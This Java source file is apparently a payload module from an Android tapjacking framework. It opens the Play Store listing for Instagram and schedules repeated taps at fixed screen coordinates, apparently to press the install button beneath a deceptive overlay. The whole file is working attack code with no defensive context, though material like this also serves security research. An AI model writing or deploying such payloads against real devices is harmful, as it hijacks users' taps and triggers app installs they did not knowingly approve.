package com.tapjacking.payloads;

import com.tapjacking.framework.FrameworkPayload;
import android.content.Intent;
import android.graphics.Point;
import android.net.Uri;

public class MarketPayload extends FrameworkPayload {
	public static String URI = "market://details?id=com.instagram.android";

	public MarketPayload() {
		for(int i=0; i<=12; i++)
			positions.add(new Point(330, 60));
	}

	@Override
	public Intent getIntent() {
		Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(URI));
		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		return intent;
	}

	@Override
	public int getSleep() {
		return 1000;
	}
}